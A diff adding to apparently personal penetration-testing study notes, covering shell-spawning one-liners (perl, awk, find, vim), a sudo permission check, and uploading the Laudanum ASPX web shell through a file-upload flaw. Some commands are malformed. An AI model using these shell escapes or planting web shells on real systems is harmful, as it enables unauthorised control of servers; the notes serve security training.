@@ -36,6 +36,19 @@
     - [Considerations](#considerations)
     - [Example](#example-1)
     - [Spawning a TTY Shell with Python](#spawning-a-tty-shell-with-python)
+  - [Spawning Interactive Shells](#spawning-interactive-shells)
+    - [/bin/sh -i](#binsh--i)
+    - [Perl](#perl)
+    - [Ruby](#ruby)
+    - [Lua](#lua)
+    - [AWK](#awk)
+    - [Find](#find)
+    - [Exec](#exec)
+    - [VIM](#vim)
+    - [Checking sudo Permissions](#checking-sudo-permissions)
+  - [Web Shells](#web-shells)
+    - [Laudanum](#laudanum)
+      - [Usage](#usage)
 
 ---
 
@@ -949,4 +962,118 @@ sh-4.2$ whoami
 whoami
 apache
 ```
+
+## Spawning Interactive Shells
+
+Sometimes your initial shell will be limited (_also referred to as a jail shell_).
+
+There may be times that you land on a system with a limited shell, and Python is not installed. In these cases, it's good to know that you could use several different methods to spawn an interactive shell.
+
+### /bin/sh -i
+
+```bash
+/bin/sh -i
+sh: no job control in this shell
+sh-4.2$
+```
+
+### Perl
+
+If the programming language Perl is present on the system, these commands will execute the shell interpreter specified.
+
+```bash
+perl —e 'exec "/bin/sh";'
+```
+
+The following command should be run from a script:
+
+```bash
+perl: exec "/bin/sh";
+```
+
+### Ruby
+
+If the programming language Ruby is present on the system, this command will execute the shell interpreter specified.
+
+The following command should be run from a script:
+
+```bash
+ruby: exec "/bin/sh"
+```
+
+### Lua
+
+If the programming language Lua is present on the system, you can use the ```os.execute``` method to execute the shell interpreter specified using the full command:
+
+```bash
+lua: os.execute('/bin/sh')
+```
+
+### AWK
+
+... can be used to spawn an interactive shell.
+
+```bash
+awk 'BEGIN {system("/bin/sh")}'
+```
+
+### Find
+
+```bash
+find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
+```
+
+### Exec
+
+```bash
+find . -exec /bin/sh \; -quit
+``` 
+
+### VIM
+
+To shell:
+
+```bash
+vim -c ':!/bin/sh'
+```
+
+Escaping:
+
+```bash
+vim
+:set shell=/bin/sh
+:shell
+```
+
+### Checking sudo Permissions
+
+```bash
+sudo -l
+Matching Defaults entries for apache on ILF-WebSrv:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User apache may run the following commands on ILF-WebSrv:
+    (ALL : ALL) NOPASSWD: ALL
+```
+
+## Web Shells
+
+A web shell is a browser-based shell session you can use to interact with the underlying OS of a web server. Again, to gain RCE via web shell, you must first find a website or web application vuln that can give you file upload capabilities. Most web shells are gained by uploading a payload written in a web language on the target server. The payload(s) you upload should give you RCE capability within the browser.
+
+### Laudanum
+
+... is a repository of ready-made files that can be used to inject onto a victim and receive back access via a reverse shell, run commands on the victim host right from the browser, and more. The repo includes injectable files for many different web app languages to include asp, aspx, jsp, php, and more. This is a staple to have on any pentest.
+
+#### Usage
+
+```bash
+d41y@htb[/htb]$ cp /usr/share/laudanum/aspx/shell.aspx /home/tester/demo.aspx
+```
+
+Add your IP address to the ```allowedIps``` variable on line 59.
+
+Now, you need to find a web app vulnerable to file upload (_ideally, one which also shows the upload path_) and navigate to it.
+
+Now, you should be able to use the input field for commands and interact with the target.
 
